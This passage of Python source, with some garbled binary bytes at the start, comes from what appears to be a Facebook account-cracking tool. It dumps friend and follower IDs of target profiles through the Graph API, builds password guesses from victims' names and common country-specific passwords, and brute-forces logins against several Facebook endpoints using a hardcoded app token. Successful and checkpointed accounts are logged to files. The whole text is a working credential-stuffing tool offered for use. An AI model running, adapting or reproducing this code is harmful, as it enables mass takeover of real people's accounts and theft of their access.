td t �}|dv �rdd}n tt	d � t�d� zFt�d| d | �}t�|j�}t�|j�}ttd |d  � W n t�y�   Y n0 z:t�d| d | �}t�|j�}ttd |d  � W n t�y$   Y n0 z:t�d| d | �}t�|j�}ttd |d  � W n t�yt   Y n0 z:t�d| d | �}t�|j�}ttd |d  � W n t�y�   Y n0 z:t�d| d | �}t�|j�}ttd |d  � W n t�y   Y n0 z:t�d| d | �}t�|j�}ttd |d  � W n t�yd   Y n0 z:t�d|	 d | �}t�|j�}ttd |d  � W n t�y�   Y n0 z:t�d|
 d | �}t�|j�}ttd |d  � W n t�y   Y n0 z:t�d| d | �}t�|j�} ttd | d  � W n t�yT   Y n0 z:t�d| d | �}!t�|!j�}"ttd |"d  � W n t�y�   Y n0 t�d| d | �}#t�d| d | �}$t�d| d | �}%t�d| d | �}&t�d| d | �}'t�d| d | �}(t�d|	 d | �})t�d|
 d | �}*t�d| d | �}+t�d| d | �},zrt d | d! d"�}-t�|#j�}.|.d# D ]>}/|/d$ }0|/d }1|�|0d% |1 � |-�|0d% |1 d � �q�|-��  W n t�y   Y n0 zrt d | d! d&�}-t�|$j�}2|2d# D ]>}3|3d$ }0|3d }1|�|0d% |1 � |-�|0d% |1 d � �q2|-��  W n t�y�   Y n0 zrt d | d! d&�}-t�|%j�}4|4d# D ]>}5|5d$ }0|5d }1|�|0d% |1 � |-�|0d% |1 d � �q�|-��  W n t�y   Y n0 zrt d | d! d&�}-t�|&j�}6|6d# D ]>}7|7d$ }0|7d }1|�|0d% |1 � |-�|0d% |1 d � �qB|-��  W n t�y�   Y n0 zrt d | d! d&�}-t�|'j�}8|8d# D ]>}9|9d$ }0|9d }1|�|0d% |1 � |-�|0d% |1 d � �q�|-��  W n t�y(   Y n0 zrt d | d! d&�}-t�|(j�}:|:d# D ]>};|;d$ }0|;d }1|�|0d% |1 � |-�|0d% |1 d � �qR|-��  W n t�y�   Y n0 zrt d | d! d&�}-t�|)j�}<|<d# D ]>}=|=d$ }0|=d }1|�|0d% |1 � |-�|0d% |1 d � �q�|-��  W n t�	y8   Y n0 zrt d | d! d&�}-t�|*j�}>|>d# D ]>}?|?d$ }0|?d }1|�|0d% |1 � |-�|0d% |1 d � �	qb|-��  W n t�	y�   Y n0 zrt d | d! d&�}-t�|+j�}@|@d# D ]>}A|Ad$ }0|Ad }1|�|0d% |1 � |-�|0d% |1 d � �	q�|-��  W n t�
yH   Y n0 zrt d | d! d&�}-t�|,j�}B|Bd# D ]>}C|Cd$ }0|Cd }1|�|0d% |1 � |-�|0d% |1 d � �
qr|-��  W n t�
y�   Y n0 W n t�
y�   Y n0 td't	 d(ttt|��f  d)d*� tj��  tdt	 d+ t d  | d! � t
t	d, � t�  d S )-Nr�   r   rB  r   r   � Cookie/Token Invalidrj  r   z.Fill In 'me' If You Want From Your Own PublicszID Public : r;   �Don't Empty!!r
   zID Public 02 (skip) : zID Public 03 (skip) : zID Public 04 (skip) : zID Public 05 (skip) : zID Public 06 (skip) : zID Public 07 (skip) : zID Public 08 (skip) : zID Public 09 (skip) : zID Public 10 (skip) : r�   rh   �Wait a moment Checking ID !!r�   r�   r�   �Name : r�   r�   r:  r;  rC   r�   r�   r�   r<  �
�Total ID : %s%sr=   ��end�Dump Results Saved In : �Press enter !!) r+   r,   r-   rP   r�   r�   r   r   r�   rL   rK   r�   r�   r$   r%   rV  r�   rF   rG   r�   r�   rI   rV   r�   r"   rQ   r   rN   r    r!   r#   r�   �Dr3   r�   r�   r�   �idt2�idt3�idt4�idt5�idt6�idt7�idt8�idt9�idt10r]  �pok�spr�   �pok2�sp2�pok3�sp3�pok4�sp4�pok5�sp5�pok6�sp6�pok7�sp7�pok8�sp8�pok9�sp9�pok10�sp10r   �r2�r3�r4�r5�r6�r7�r8�r9�r10rP  r&   rM   r�   r�   �z2�i2�z3�i3�z4�i4�z5�i5�z6�i6�z7�i7�z8�i8�z9�i9�z10�i10r   r   r   rV  #  s�   $



. rV  c            D      C   sN  z t dd��� } t dd��� }W nF tyf   ttd t d t d t d � t�d� t�  Y n0 g }�
zftdt	 d	 � t
td
 t �}|dv r�tt	d � t�d� t�  t
td t �}t
td t �}t
td t �}t
td t �}t
td t �}t
td t �}	t
td t �}
t
td t �}t
td t �}t
td t �}|dv �rdd}n tt	d � t�d� zFt�d| d | �}t�|j�}t�|j�}ttd |d  � W n t�y�   Y n0 z:t�d| d | �}t�|j�}ttd |d  � W n t�y$   Y n0 z:t�d| d | �}t�|j�}ttd |d  � W n t�yt   Y n0 z:t�d| d | �}t�|j�}ttd |d  � W n t�y�   Y n0 z:t�d| d | �}t�|j�}ttd |d  � W n t�y   Y n0 z:t�d| d | �}t�|j�}ttd |d  � W n t�yd   Y n0 z:t�d|	 d | �}t�|j�}ttd |d  � W n t�y�   Y n0 z:t�d|
 d | �}t�|j�}ttd |d  � W n t�y   Y n0 z:t�d| d | �}t�|j�} ttd | d  � W n t�yT   Y n0 z:t�d| d | �}!t�|!j�}"ttd |"d  � W n t�y�   Y n0 t�d| d | �}#t�d| d | �}$t�d| d | �}%t�d| d | �}&t�d| d | �}'t�d| d | �}(t�d|	 d | �})t�d|
 d | �}*t�d| d | �}+t�d| d | �},zrt d | d! d"�}-t�|#j�}.|.d# D ]>}/|/d$ }0|/d }1|�|0d% |1 � |-�|0d% |1 d � �q�|-��  W n t�y   Y n0 zrt d | d! d&�}-t�|$j�}2|2d# D ]>}3|3d$ }0|3d }1|�|0d% |1 � |-�|0d% |1 d � �q2|-��  W n t�y�   Y n0 zrt d | d! d&�}-t�|%j�}4|4d# D ]>}5|5d$ }0|5d }1|�|0d% |1 � |-�|0d% |1 d � �q�|-��  W n t�y   Y n0 zrt d | d! d&�}-t�|&j�}6|6d# D ]>}7|7d$ }0|7d }1|�|0d% |1 � |-�|0d% |1 d � �qB|-��  W n t�y�   Y n0 zrt d | d! d&�}-t�|'j�}8|8d# D ]>}9|9d$ }0|9d }1|�|0d% |1 � |-�|0d% |1 d � �q�|-��  W n t�y(   Y n0 zrt d | d! d&�}-t�|(j�}:|:d# D ]>};|;d$ }0|;d }1|�|0d% |1 � |-�|0d% |1 d � �qR|-��  W n t�y�   Y n0 zrt d | d! d&�}-t�|)j�}<|<d# D ]>}=|=d$ }0|=d }1|�|0d% |1 � |-�|0d% |1 d � �q�|-��  W n t�	y8   Y n0 zrt d | d! d&�}-t�|*j�}>|>d# D ]>}?|?d$ }0|?d }1|�|0d% |1 � |-�|0d% |1 d � �	qb|-��  W n t�	y�   Y n0 zrt d | d! d&�}-t�|+j�}@|@d# D ]>}A|Ad$ }0|Ad }1|�|0d% |1 � |-�|0d% |1 d � �	q�|-��  W n t�
yH   Y n0 zrt d | d! d&�}-t�|,j�}B|Bd# D ]>}C|Cd$ }0|Cd }1|�|0d% |1 � |-�|0d% |1 d � �
qr|-��  W n t�
y�   Y n0 W n t�
y�   Y n0 td't	 d(ttt|��f  d)d*� tj��  tdt	 d+ t d  | d! � t
t	d, � t�  d S )-Nr�   r   rB  r   r   r�  rj  r   �0Fill In 'me' If You Want From Your Own Followers�ID Follow 01 : r;   r�  r
   �ID Follow 02 (skip) : �ID Follow 03 (skip) : �ID Follow 04 (skip) : �ID Follow 05 (skip) : �ID Follow 06 (skip) : �ID Follow 07 (skip) : �ID Follow 08 (skip) : �ID Follow 09 (skip) : �ID Follow 10 (skip) : r�   rh   r�  r�   r�   r�   r�  r�   r�   r:  r;  rC   r�   r�   r�   r<  r�  r�  r=   r�  r�  r�  ) r+   r,   r-   rP   r�   r�   r   r   r�   rL   rK   r�   r�   r$   r%   rW  r�   rF   rG   r�   r�   rI   rV   r�   r"   rQ   r   rN   r    r!   r#   r�   r�  r   r   r   rW  �  s�   $



. rW  c            E         s  z t dd��� } t dd��� }W nF tyf   ttd | d t d | d � t�d� t�  Y n0 g � �
zftdt d	 � t	t
d
 t �}|dv r�ttd � t�d� t�  t	t
d t �}t	t
d t �}t	t
d t �}t	t
d t �}t	t
d t �}t	t
d t �}	t	t
d t �}
t	t
d t �}t	t
d t �}t	t
d t �}|dv �rdd}n ttd � t�d� zFt�d| d | �}t�|j�}t�|j�}tt
d |d  � W n t�y�   Y n0 z:t�d| d | �}t�|j�}tt
d |d  � W n t�y$   Y n0 z:t�d| d | �}t�|j�}tt
d |d  � W n t�yt   Y n0 z:t�d| d | �}t�|j�}tt
d |d  � W n t�y�   Y n0 z:t�d| d | �}t�|j�}tt
d |d  � W n t�y   Y n0 z:t�d| d | �}t�|j�}tt
d |d  � W n t�yd   Y n0 z:t�d|	 d | �}t�|j�}tt
d |d  � W n t�y�   Y n0 z:t�d|
 d | �}t�|j�}tt
d |d  � W n t�y   Y n0 z:t�d| d | �}t�|j�} tt
d | d  � W n t�yT   Y n0 z:t�d| d | �}!t�|!j�}"tt
d |"d  � W n t�y�   Y n0 t�d| d | �}#t�d| d | �}$t�d| d | �}%t�d| d | �}&t�d| d | �}'t�d| d | �}(t�d|	 d | �})t�d|
 d | �}*t�d| d | �}+t�d| d | �},zrt d | d! d"�}-t�|#j�}.|.d# D ]>}/|/d$ }0|/d }1� �|0d% |1 � |-�|0d% |1 d � �q�|-��  W n t�y   Y n0 zrt d | d! d&�}-t�|$j�}2|2d# D ]>}3|3d$ }0|3d }1� �|0d% |1 � |-�|0d% |1 d � �q2|-��  W n t�y�   Y n0 zrt d | d! d&�}-t�|%j�}4|4d# D ]>}5|5d$ }0|5d }1� �|0d% |1 � |-�|0d% |1 d � �q�|-��  W n t�y   Y n0 zrt d | d! d&�}-t�|&j�}6|6d# D ]>}7|7d$ }0|7d }1� �|0d% |1 � |-�|0d% |1 d � �qB|-��  W n t�y�   Y n0 zrt d | d! d&�}-t�|'j�}8|8d# D ]>}9|9d$ }0|9d }1� �|0d% |1 � |-�|0d% |1 d � �q�|-��  W n t�y(   Y n0 zrt d | d! d&�}-t�|(j�}:|:d# D ]>};|;d$ }0|;d }1� �|0d% |1 � |-�|0d% |1 d � �qR|-��  W n t�y�   Y n0 zrt d | d! d&�}-t�|)j�}<|<d# D ]>}=|=d$ }0|=d }1� �|0d% |1 � |-�|0d% |1 d � �q�|-��  W n t�	y8   Y n0 zrt d | d! d&�}-t�|*j�}>|>d# D ]>}?|?d$ }0|?d }1� �|0d% |1 � |-�|0d% |1 d � �	qb|-��  W n t�	y�   Y n0 zrt d | d! d&�}-t�|+j�}@|@d# D ]>}A|Ad$ }0|Ad }1� �|0d% |1 � |-�|0d% |1 d � �	q�|-��  W n t�
yH   Y n0 zrt d | d! d&�}-t�|,j�}B|Bd# D ]>}C|Cd$ }0|Cd }1� �|0d% |1 � |-�|0d% |1 d � �
qr|-��  W n t�
y�   Y n0 W n t�
y�   Y n0 � fd'd(�}Dtd)�}|�|D� � t�  d S )*Nr�   r   rB  r   r   r�  rj  r   r�  r�  r;   r�  r
   r�  r�  r�  r�  r�  r�  r�  r�  r�  r�   rh   r�  r�   r�   r�   r�  r�   r�   r:  r;  rC   r�   r�   r�   r<  c                    s�  | }t j�d�r0td��� �� }|�d�\}}nd}d}|�d�\}}z|dv r`td� t�  n W n   Y n0 z|dv r�td� t�  n W n   Y n0 z t	�
||g�}t	�
dd	g�}W n   Y n0 zt �d
� W n ty�   Y n0 zpt	�
tttttttg�}	td7 atj�dt|t|	tttt� ��tttt��ttttt��tf � tj��  W n   Y n0 �zt�|�� d � t�|�� d � t�|�� d � tD �]�}
tj d||
dd�d|id�}|j!}d|v �s�d|v �s�d|v �s�d|v �r^td| d |
 d � t�|d |
 � tdd�}|�t|�d t|
� d � |�"�   �qv�q��q�d|v �s|d|v �s|d |v �r�z<t�#d!t|� d" td#d$���  �}t$�%|j&�}|d% }W n   d&}Y n0 td'| d |
 d | � t�|d |
 d | � td(d�}|�t|�d t|
� d | d � |�"�  td)d�}|�t|�d t|
� d � |�"�   �qv�q��q�td7 aW n   Y n0 d S )*Nz.uar\   zyMozilla/5.0 (Series40; NokiaC2-03/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31�lMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36r�   r;   z+ [+] Harap Ganti User Agent Karena Error !!r�   r�   Zoutr
   z1 [UA : %s%s%s] %s%s%s/%s OK : %s%s%s CP : %s%s%s�123�1234�12345z$https://touch.facebook.com/login.phpr�   )r  r  r  r
  )r�   r  �homerG   �saveZactorz [0;97m[[0;92mOK[0;97m] z | r   z
out/ok.txtrL  r  ZconfirmZcuidr�   r�   r�   r   r�   r=   z [0;97m[[0;93mCP[0;97m] z
out/cp.txtzout/nottl.txt)'r   r/   r0   r+   r,   rJ   r�   rP   rR   r3  r4  r�  r�  r�   r�   r�   r�   r�   r�   �jgr    r!   r"   r   rN   �ok�cpr#   Zpwxr�   �lowerrF   r  �urlrQ   rG   r�   r�   rI   )�arg�userZuaxxZua1Zua2r�   r�   r-  ZuaqrL   Zpass1ZrexZxor�  �ke�tt�ttlZsavett�r�   r   r   �main�  s�    P
(
$
&
zcrackduaua.<locals>.mainr�  )r+   r,   r-   rP   r�   r   r   r�   rL   rK   r�   r�   r$   r%   rW  r�   rF   rG   r�   r�   rI   rV   r�   r"   rQ   �
ThreadPool�maprR   )Er3   r�   r�   r�   r�  r�  r�  r�  r�  r�  r�  r�  r�  r]  r�  r�  r�   r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r   r�  r�  r�  r�  r�  r�  r�  r�  r�  rP  r&   rM   r�   r�   r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r   r�  r   �
crackduaua�  s�   $



Mr�  c                 C   s  t td t d t d t d t d t d t d � t td t d	 t d t d
 t d t d t d � t td t d t d t d t d t d t d � t td t d t d t d t d t d t d � t td t d t d t d t d t d t d � ttd t d t d t d �}|dv �r�t td t d t d t d � t| � n�|dv �r�t| � n||dv �r�t| � nh|dv �r�t| � nT|dv �r�t	| � n@|dv �r�t
| � n,t td t d t d t d � t| � d S )NrB  r�   r   z Api rg   z SPAM CRACK 57% r�   r   r�   z Api + Ttl z SPAM CRACK 76% r�   z Mbasic + Opsi Sensiz SPAM CRACK 25% r�   z Free Facebook z SPAM CRACK 0%r�   z Graph Facebook r   rN  )r<   r   rO  r�   r�   r�   r�   r�   )rP   r�   r�   rM   rK   rX  �bapi�bapittl�crack�crackffb�grap)r�   �krahr   r   r   rX    s*    <<<<<$
$










$rX  c                 C   s&  g }t dd��� }| �d�D �]}t|�dk r2qq|�� }t|�dks^t|�dks^t|�dkr�|�|d � |�|d � |�|d	 � q|�|� d
|v r�|�d� |�d� |�d� qd|v r�|�d� |�d� |�d� |�d� qd|v �r|�d� |�d� |�d� qd|v �rL|�d� |�d� |�d� |�d� qd|v �r�|�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d � |�d� |�d!� |�d"� |�d#� qd$|v �r�|�d� qd%|v r|�d� |�d!� |�d"� |�d#� |�d� q|S )&N�	.pass.txtr   r=   r@   �   �   r�  r�  r�  r�   ZsayangZanjingr�   �bdZ786786Z000786Z102030Z556677�pkZpakistan�usZ123456ZqwertyZiloveyouZ	passwords�allZsayangkuZ	bismillahZ	indonesiaZbajinganZbangsatZ	katasandiZ1234567Z12345678Z	123456789�noner>  )r+   r,   r�   rN   r�  r�   )rI   ZresultsZctrM   r   r   r   �generate  sf    $





























r�  c                  C   s�  t td �t�d�f t dt d t d t d t d � t td t d t d t d	 � t td t d
 t d t d � t td t d t d t d � t td t d t d t d � t td t d t d t d � t td t d t d t d � tdt d t �} | dv �rTt td �t�d�f t	�  �n6| dv �r~t
dd�}|�d� |��  �n| dv �r�t
dd�}|�d� |��  n�| dv �r�t
dd�}|�d� |��  n�| d v �r�t
dd�}|�d!� |��  n�| d"v �rt
dd�}|�d#� |��  nl| d$v �rFt
dd�}|�d%� |��  nD| d&v �rnt
dd�}|�d'� |��  nt td �t�d�f t	�  d S )(NzPlease Choose Password..r�   r   r   r�   r   z name123,name1234,name12345r�   z India/Bangladeshr�   z	 Pakistanr�   z United Statesr�   z
 Indonesiar�   z Old Passwordsr�   z All Passwords From IndonesiazLanguage : r;   zPlease Fill Correctlyr
   r�   r�  rC   r�  r�   r�  r�   r�  r�   r�  r�   r�   r�   r>  r�   r�  )rP   rL   r$   r%   r�   r�   rK   r�   r�   �pilih_pwr+   r"   rQ   )Znjjr?  r   r   r   r�  U  sT    ($$$$$$




























r�  c           
      C   s�  t �� }|j�dddddddd�� |�d	�}t�|jd
�}d�tj	�
d|j��}i }|d�D ]~}|�d�d u r�|�d�dkr�|�d| i� q�|�d�dkr�|�d|i� q�|�|�d�di� q^|�|�d�|�d�i� q^|�|dddddddd�� |j�ddi� |jd|d�j}	dt|j�� �� �v �rFd| ||j�� d�S dt|j�� �� �v �rrd| ||j�� d�S d| |d�S d S ) Nr�   r�   r�   z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8r  r  �r  r  r  r
  r  r  r  zhttps://mbasic.facebook.com/r  r<   �dtsg":\{"token":"(.*?)"rK   r  r�   r  r  r�   �d�r  Zm_sessZ__userZ__reqZ__csrZ__aZ__dynZencpassr  z:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8z~https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100r!  r  �success��statusr  r  r*  r  r�  �error�r  r  r  )rF   r$  r  r%  rG   �bs4�BeautifulSouprI   rc  �re�findallr  r.  r*  �get_dict�keys)
�em�pas�hostsr   r�   �bZmetar�   rM   �por   r   r   �mbasic�  s4    

��r  �m.facebook.comr�   r�   r�  r  r  r�  c           
      C   sj  t �� }|j�t� |�d�}t�|jd�}d�	tj
�d|j��}i }|d�D ]~}|�d�d u r�|�d�dkr~|�d| i� q�|�d�d	kr�|�d	|i� q�|�|�d�di� qN|�|�d�|�d�i� qN|�|dd
dddddd�� |j�ddi� |jd|d�j}	d|j�� �� v �r2d| ||j�� d�S d|j�� �� v �rZd| ||j�� d�S d| |d�S d S )Nr�   r  r<   r   rK   r  r�   r  r  r�   r  r  r  z9https://graph.facebook.com/login/?next&ref=dbl&fl&refid=8z}https://graph.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100r!  r  r  r  r  r�  r  r  )rF   r$  r  r%  �graph_hrG   r  r	  rI   rc  r
  r  r  r*  r  r  )
r  r  r  r   r�   r  Zdtgr�   rM   r  r   r   r   �graph�  s4    

��r  c                   @   s$   e Zd Zdd� Zdd� Zdd� ZdS )r�  c              
   C   s  g | _ g | _d| _tdt d t d t d t d t d t d t d	 t d
 �}|dkrfqq|dksx|dk�r�z�z"|| _t| j��	� �
� | _W q�W qz ty� } z*ttd � t�  W Y d }~qzW Y d }~qzd }~0 0 qzg | _| jD ]4}z| j�d|�d�d i� W q�   Y q�Y q�0 q�W n> t�yd } z$ttd � W Y d }~qW Y d }~n
d }~0 0 ttd � | ��  �qq|dk�s�|dkrz�z$|| _t| j��	� �
� | _W �qW nF t�y� } z,ttd � t�  W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �qY n0 �qW nD t�y� } z*ttd � t�  W Y d }~qW Y d }~n
d }~0 0 tdt d t d t d � ttd t d t d � td��| j| j� t�| j� ttd � �qqd S ) Nr   r   r   r   r   �& Do You Want To Use Manual Password?? �[ �Y/n� ]z : r<   �y�YzProblem Not Found !!r�   r�   zProblem Not Foundz Password Example : sayang,anjing�n�Nr
   �r�   r,  zFile Tidak Valid�Ok Crack Results Saved At : �	Hasil/OK-�.txt�Cp Crack Results Saved At : �	Hasil/CP-�.txt
r:   zDone ...)�adar�  �korK   r�   r�   �h�apkr+   r,   r�   �fsr�   rP   rL   r�   �flr�   r�   r�   �pwlistr�  r�   rI  r�  r�  r�  r   r�  ��self�isifiler�  r'   rM   r   r   r   �__init__�  sf    H$
"
(
." zgrap.__init__c                 C   s�   t td ��d�| _t| j�dkr,| ��  n�| jD ]}|�d| ji� q2tdt	 d t
 d t d � tt	d	 t
 d
 t d � td��| j| j� t�| j� td� d S )NzPassword : �,r   r,  r   r   r!  r"  r#  r$  r%  r�  z
Done..)rK   r�   r�   r,  rN   r,  r+  r%  rP   rL   r�   rI  r�  r�  r�  r   r�  r)  �r.  rM   r   r   r   r,  �  s    

 zgrap.pwlistc                 C   s�  �z�|� d�D �]h}t|� d�|d�}|� d�dkr�ttd t d t d t |� d�d	 | d
  � | j�d|� d�|f � |� d�tdt d ��	� v r� �qzn&tdt d d��
d|� d�|f � d|� d�|f } �qzq|� d�dkrttd t d t d t |� d�d | d
  � | j�d|� d�|f � tdt d d��
d|� d�|f �  �qzqqq|  jd7  _td| jt| j�t| j�t| j�f dd� tj��  W n   | �|� Y n0 d S )Nr,  r�   zhttps://graph.facebook.comr  r  z[r2  r   z[0;97m|[0;92mz      �%s|%sr!  r"  r<  z%s|%s

r�  r1  z[0;97m|[0;93m r$  �%s|%s
r
   �o[0;33m[[0;37mCrack[0;33m][0;37m %s/%s [0;32m([0;37mOK : %s[0;32m) [0;33m([0;37mCP : %s[0;33m)[0;37mr=   r�  )rG   r  rP   r�   r�   r&  r�   r+   rI  r,   r"   r�   r�  r'  rN   r+  r    r!   r#   r�  )r.  r+  rM   �logr'  r   r   r   r�    s6    
�6�6�:z	grap.mainN)�__name__�
__module__�__qualname__r0  r,  r�  r   r   r   r   r�  �  s   7r�  c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
r�  c                 C   s&   d| _ g | _g | _d| _| �|� d S �NFr   ��setpwr�  r�  �loopr�  �r.  r/  r   r   r   r0    s
    zbapittl.__init__c              
   C   s0  t �  tdt d t d t d t d t d t d t d t � ttd t d t d t d	 �}|d
v r�ttd t d t d t d � qJqJ|dv �r��z4z$|| _t| j��� �	� | _
W �q.W q� t�y* } z@ttd t d t d t d|  � W Y d }~q�W Y d }~q�d }~0 0 q�g | _ttd t d t d t d � ttd t d t d t d ��d�| _t| j�dk�r�W qJ| j
D ]<}z"| j�|�d�d | jd�� W n   Y �q�Y n0 �q�W n> t�y } z$td| � W Y d }~qJW Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�  �q,qJ|dv rJz�z$|| _t| j��� �	� | _
W �q"W n< t�y } z"t|� W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| j
D ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q.Y n0 �q.W n   Y qJY n0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j� t�  �q,qJd S )Nr   r   r   r   r  r  r  r  z Dumai-991 : r;   r   � Invalid Number�r  r  � %s�" Example : sayang,bismillah,123456� Password List : r1  r   r�   r  �  %srB  � Crack Started...�" Account [OK] Saved to : Hasil/OK-r"  �" Account [CP] Saved to : Hasil/CP-r%  r�  �r  r  r
   �r�  rP   r�   r�   r(  rK   r)  r+   r,   r�   r*  r�   r+  r�   r,  rN   r�   rI  r�  r�  �bruterR   r�  r   r�  r-  r   r   r   r�  %  sj    D$$

($$,
""t
(
.
tzbapittl.krahc           	   
   C   s�  ddd|d|dddd�	}d	}t j||d
�}t�d|j�r�| j�|d | � td||tf � t�|d | � t	dt
 d d�}|�t|�d t|� d � |��  dS d|�� d v �r~z<t �dt|� d t	dd���  �}t�|j�}|d aW n   Y n0 | j�|d | d t � td||tf � t	dt
 d d�}|�t|�d t|� d tt� d � |��  dS dS )N�/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32�JSONr�   �en_US�iosr�   � 3f555f99fb61fcd7aa0c44f58f522ef6�	Zaccess_token�formatZsdk_versionr  Zlocale�passwordZsdkZgenerate_session_cookiesZsig�,https://b-api.facebook.com/method/auth.login��params�	(EAAA)\w+r\   �2[0;32m[[0;37mOK[0;32m] %s|%s %s               r!  r"  rL  r   T�www.facebook.com�	error_msgr�   r�   r�   r   r�   z*[0;33m[[0;37mCP[0;33m] %s|%s|%s[0m   zCP-r<  F)rF   rG   r
  �searchrI   r�  r�   rP   r  r+   rI  r"   r   rQ   r�   r,   r�   r�  r�  )	r.  �usernamerR  rU  �api�responser�  r�  r�  r   r   r   �bruteRequest_  s0    $*zbapittl.bruteRequestc                 C   s4  | j dkr�|  jd7  _|d D ]z}|d �� }|�� }z| �||�dkrPW  q�W n   Y q Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q n�|  jd7  _| j D ]|}td �� }|�� }z| �||�dkr�W  �q0W n   Y q�Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q�d S )	NFr
   r,  r�   T�o[0;33m[[0;37mCrack[0;33m][0;37m %s/%s [0;32m[[0;37mOK : %s[0;32m] [0;33m[[0;37mCP : %s[0;33m][0;37mr=   r�  )r<  r=  r�  r^  rP   rN   r+  r�  r�  r    r!   r#   �users�r.  r+  r,  r[  rR  r   r   r   rJ  z  s*    


:

zbapittl.bruteN�r7  r8  r9  r0  r�  r^  rJ  r   r   r   r   r�    s   :r�  c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
r�  c                 C   s&   d| _ g | _g | _d| _| �|� d S r:  r;  r>  r   r   r   r0  �  s
    zbapi.__init__c              
   C   s0  t �  tdt d t d t d t d t d t d t d t � ttd t d t d t d	 �}|d
v r�ttd t d t d t d � qJqJ|dv �r��z4z$|| _t| j��� �	� | _
W �q.W q� t�y* } z@ttd t d t d t d|  � W Y d }~q�W Y d }~q�d }~0 0 q�g | _ttd t d t d t d � ttd t d t d t d ��d�| _t| j�dk�r�W qJ| j
D ]<}z"| j�|�d�d | jd�� W n   Y �q�Y n0 �q�W n> t�y } z$td| � W Y d }~qJW Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�  �q,qJ|dv rJz�z$|| _t| j��� �	� | _
W �q"W n< t�y } z"t|� W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| j
D ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q.Y n0 �q.W n   Y qJY n0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j� t�  �q,qJd S )Nr   r   r   r   r  r  r  r  z Dumai-991 ?: r;   r   r?  r@  rA  rB  rC  r1  r   r�   r  rD  rB  rE  rF  r"  rG  r%  r�  rH  r
   rI  r-  r   r   r   r�  �  sj    D$$

($$,
""t
(
.
tz	bapi.krahc              
   C   s$  ddd|d|dddd�	}d	}t j||d
�}t�d|j�r�| j�|d | � td||tf � t�|d | � t	dt
 d d�}|�t|�d t|� d � |��  dS d|�� d v �r | j�|d | � td||tf � t	dt
 d d�}|�t|�d t|� d � |��  dS dS )NrK  rL  r�   rM  rN  r�   rO  rP  rS  rT  rV  r\   rW  r!  r"  rL  r   TrX  rY  z2[0;33m[[0;37mCP[0;33m] %s|%s %s               r$  r<  F)rF   rG   r
  rZ  rI   r�  r�   rP   r  r+   rI  r"   r   rQ   r�   r�  )r.  r[  rR  rU  r\  r]  r�  r   r   r   r^  �  s&    zbapi.bruteRequestc              	   C   s<  | j dkr�|  jd7  _|d D ]z}|d �� }|�� }z| �||�dkrPW  q�W n   Y q Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q n�|  jd7  _| j D ]�}td �� }|�� }z| �||�dkr�W  �q8W n   Y q�Y n0 td	t d
| jt| j�t| j�t| j�f  dd� t	j
��  q�d S )NFr
   r,  r�   Tr5  r=   r�  z[0;33m[[0;37mzZ[0;33m][0;37m %s/%s [0;32m([0;37mOK : %s[0;32m) [0;33m([0;37mCP : %s[0;33m)[0;37m)r<  r=  r�  r^  rP   rN   r+  r�  r�  r    r!   r#   r`  rI  ra  r   r   r   rJ  �  s*    


:

z
bapi.bruteNrb  r   r   r   r   r�  �  s   :r�  c                   @   s4   e Zd Ze�d� e�  dd� Zdd� Zdd� ZdS )	r�  r   c              
   C   sX  g | _ g | _d| _t�  tdt d t d t d t d t d t d t d	 t � ttd t d t d t d
 �}|dkr�q\q\|dv �r�z�z"|| _	t
| j	��� �� | _W q�W q� ty� } z$td| � W Y d }~q�W Y d }~q�d }~0 0 q�g | _| jD ]8}z| j�d|�d�d i� W n   Y �qY n0 �qW n> t�y� } z$td| � W Y d }~q\W Y d }~n
d }~0 0 ttd t d t d t d � | ��  �qTq\|dv r\z�z$|| _	t
| j	��� �� | _W �q(W n@ t�y" } z&td| � W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q4Y n0 �q4W n2 t�y� } ztd| � W Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j	� t�  �qTq\d S )Nr   r   r   r   r   r  r  r  r  rN  r<   �r  r  �   %sr�   r�   rB  )r  r  r
   r  rB  rE  rF  r"  rG  r%  r:   �r&  r�  r'  r�  rP   r�   r�   r(  rK   r)  r+   r,   r�   r*  r�   r+  r�   r�   r,  r�  rI  r�  r�  r�  r   r�  rR   r-  r   r   r   r0  	  s`    D$
$
"$
(
